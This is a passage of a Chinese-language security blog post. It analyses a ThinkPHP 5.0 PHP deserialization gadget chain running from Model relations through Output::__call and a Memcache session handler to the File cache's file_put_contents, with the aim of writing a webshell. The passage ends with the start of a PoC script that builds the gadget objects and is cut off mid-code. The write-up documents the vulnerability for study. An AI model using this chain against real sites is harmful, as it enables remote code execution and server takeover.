&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>传入的参数 <code>$modelRelation</code>  需要为 <code>Relation</code>  类的实例，或者任何从 <code>Relation</code> 类继承而来的子类实例</p><p>再看到<code>if</code> 判断语句, 进入到里面需要满足三个条件 </p><ol><li><code>$this-&gt;parent</code> 可控, 可以满足</li><li><code>!$modelRelation-&gt;isSelfRelation() </code> , 需要<code>isSelfRelation()</code>返回为 false</li><li><code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</code></li></ol><h5 id="第二个条件-isSelfRelation"><a href="#第二个条件-isSelfRelation" class="headerlink" title="第二个条件  isSelfRelation()"></a>第二个条件 <code> isSelfRelation()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isSelfRelation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;selfRelation;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$selfRelation</code> 可控, 可以满足第二个条件</p><h5 id="第三个条件-getModel"><a href="#第三个条件-getModel" class="headerlink" title="第三个条件 getModel()"></a>第三个条件 <code>getModel()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getModel</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$query</code>可控, 所以需要寻找在某个类里面有可控的 <code>getModel()</code><br>在 <code>Query.php</code>中 存在<code>getModel()</code> 可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;model;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而且 <code>$this-&gt;parent</code> 可控, 所以可以满足第三个条件<br>能够满足三个条件, 进入到<code>if</code> 语句里面去</p><p> <code>$value = $this-&gt;parent</code>,  从而可以控制到 <code>$value</code> 的值<br> 现在 <code>$value</code> 的值可控 , 继续向下走</p><h4 id="来到method-exists-modelRelation-getBindAttr"><a href="#来到method-exists-modelRelation-getBindAttr" class="headerlink" title="来到method_exists($modelRelation, &#39;getBindAttr&#39;)"></a>来到<code>method_exists($modelRelation, &#39;getBindAttr&#39;)</code></h4><p><code>$modelRelation</code> 里面需要有 <code>getBindAttr()</code> 方法</p><p>前面可知 <code>$modelRelation</code>  需要是  <code>Relation</code>  类的实例，或者任何从 <code>Relation</code> 类继承而来的子类实例<br>现在还需要满足 有 <code>getBindAttr()</code> 方法<br>搜索可以发现  只有<code>OneToOne</code> 类中存在<code>getBindAttr()</code> 方法 , 而且 <code>OneToOne</code>类也是继承<code>Relation</code> 类的子类, 满足条件<br>但是<code>OneToOne</code> 是个抽象类, 无法实例化, 又需要找它的子类 , 可以找到 <code>HasOne</code><br>可以令 <code>$modelRelation</code>的值为 <code>HasOne</code> </p><h4 id="接着就是if-bindAttr"><a href="#接着就是if-bindAttr" class="headerlink" title="接着就是if ($bindAttr)"></a>接着就是<code>if ($bindAttr)</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;bindAttr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//$this-&gt;bindAttr可控</span></span><br></pre></td></tr></table></figure><p><code>$bindAttr = $modelRelation-&gt;getBindAttr()</code>  ,  所以<code> $bindAttr</code> 可控, 进入到if语句中</p><p>然后因为<code>$data</code>默认为空,  就可以进入到  <code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code></p><p>就可以控制 <code>$value</code> 进入到 <code>__call()</code> 方法实现写shell<br>现在就需要找到适合写shell 的 <code>__call()</code> 方法</p><h3 id="Output-php-里面的-call-方法"><a href="#Output-php-里面的-call-方法" class="headerlink" title=" Output.php 里面的   __call()方法"></a><code> Output.php</code> 里面的  <code> __call()</code>方法</h3><p><code>$methon</code> –&gt;<code>getAttr()</code>  <code>$args</code> –&gt;<code>$attr</code> –&gt; <code>$this-&gt;bindAttr</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handle &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;handle, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;styles</code> 可控, 进入到 <code>if</code>里面</p><h4 id="找一下-block-方法"><a href="#找一下-block-方法" class="headerlink" title="找一下 block() 方法"></a>找一下 <code>block()</code> 方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="找到writeln方法"><a href="#找到writeln方法" class="headerlink" title="找到writeln方法"></a>找到<code>writeln</code>方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="找到-write-方法"><a href="#找到-write-方法" class="headerlink" title="找到 write 方法"></a>找到 <code>write</code> 方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;handle</code> 可控, 再搜索看看还有哪些类存在 <code>write</code> 方法</p><h4 id="Memcache-php中的write方法"><a href="#Memcache-php中的write方法" class="headerlink" title="Memcache.php中的write方法"></a>Memcache.php中的<code>write</code>方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$this→headler</code>可控, 再找可利用的 <code>set</code> 方法</p><h4 id="File-php的set"><a href="#File-php的set" class="headerlink" title="File.php的set"></a>File.php的<code>set</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;<span class="title function_ invoke__">getTimestamp</span>() - <span class="title function_ invoke__">time</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">clearstatcache</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在函数<code>file_put_contents</code>，可以想办法利用写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>向上看看 <code>$filename</code>和 <code>$data</code> 是否可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h5 id="跟进getCacheKey"><a href="#跟进getCacheKey" class="headerlink" title="跟进getCacheKey()"></a>跟进<code>getCacheKey()</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$dir</span>      = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;options</code>可控<br><code>$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</code> 后缀名已经固定为 <code>.php</code> 了, 且文件名的一部分是可控的</p><p>再去看看 <code>$data</code>是否可控</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p><code>$data</code>是第二个参数<code>$value</code>的序列化值，不可控, 也就无法写入想要的内容</p><p>继续向下走, 可以看到后面调用了一个 <code>setTagItem</code>方法 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><h5 id="setTagItem方法"><a href="#setTagItem方法" class="headerlink" title="setTagItem方法"></a><code>setTagItem</code>方法</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag) &#123;</span><br><span class="line">            <span class="variable">$key</span>       = <span class="string">&#x27;tag_&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">                <span class="variable">$value</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>));</span><br><span class="line">                <span class="variable">$value</span>[] = <span class="variable">$name</span>;</span><br><span class="line">                <span class="variable">$value</span>   = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_unique</span>(<span class="variable">$value</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$name</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到后面又一次调用了 <code>set()</code>方法, 且此时的参数 <code>$value</code>可控,<br><code>$value</code> –&gt; <code>$name</code> –&gt; <code>$filename</code> </p><p>第二次调用<code>set()</code> 方法, <code>$key</code> 参数也就是前面<code>set()</code>方法的 <code>$name</code>参数 会再次进入 <code>getCacheKey</code> 方法,<br>导致这个参数也是可控的</p><p>所以在第二次调用<code>set</code>时，<code>file_put_contents</code>的俩个参数都可控 ,也就可以写入shell了</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span> &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="variable">$files</span>]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span> &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span 